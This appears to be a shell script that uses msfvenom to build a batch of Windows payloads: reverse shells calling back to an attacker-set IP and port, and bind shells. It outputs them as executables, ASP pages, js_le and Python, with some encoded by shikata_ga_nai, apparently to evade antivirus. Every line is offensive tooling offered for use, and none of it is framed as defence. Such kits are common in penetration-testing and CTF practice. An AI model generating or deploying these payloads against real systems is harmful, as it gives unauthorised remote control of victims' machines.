mkdir payloads_windows
cd payloads_windows

  # Reverse shells
  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -a x86 --platform windows -o shell_reverse_tcp_x86.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -a x64 --platform windows -o shell_reverse_tcp_x64.exe

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -a x86 --platform windows -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -a x64 --platform windows -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x64.python

  # Bind shells
  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -a x86 --platform windows -o shell_bind_tcp_x86.exe
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -a x64 --platform windows -o shell_bind_tcp_x64.exe

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -a x86 --platform windows -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -a x64 --platform windows -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x86.python
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x64.python

  # Create all common shells in payloads_windows folder
  bash ../_setup/setup_payloads.sh

cd -
